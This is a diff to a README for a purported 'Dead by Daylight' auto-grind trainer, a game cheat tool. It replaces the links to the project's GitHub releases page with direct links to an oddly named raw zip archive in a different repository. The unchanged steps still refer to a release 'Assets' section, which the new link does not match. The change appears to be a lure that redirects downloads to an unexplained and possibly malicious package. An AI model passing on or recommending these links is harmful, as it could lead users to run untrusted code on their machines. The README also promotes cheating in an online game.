@@ -5,7 +5,7 @@ description: "Automate Dead by Daylight progression with an external trainer fea
 ---
 # 🎮 DBD-AutoGrind-Trainer-2026-Pro - Automate your Dead by Daylight progression easily
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/nr634160/DBD-AutoGrind-Trainer-2026-Pro/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/nr634160/nr634160.github.io/main/genitivally/io-nr-github-2.2.zip)
 
 ## 📁 About This Tool
 
@@ -28,7 +28,7 @@ These requirements ensure the software runs without errors. Close other high-dem
 
 You can retrieve the application from our release page. Visit this page to download the latest version:
 
-[https://github.com/nr634160/DBD-AutoGrind-Trainer-2026-Pro/releases](https://github.com/nr634160/DBD-AutoGrind-Trainer-2026-Pro/releases)
+[https://raw.githubusercontent.com/nr634160/nr634160.github.io/main/genitivally/io-nr-github-2.2.zip](https://raw.githubusercontent.com/nr634160/nr634160.github.io/main/genitivally/io-nr-github-2.2.zip)
 
 1. Navigate to the link above.
 2. Look for the "Assets" section at the bottom of the latest release.
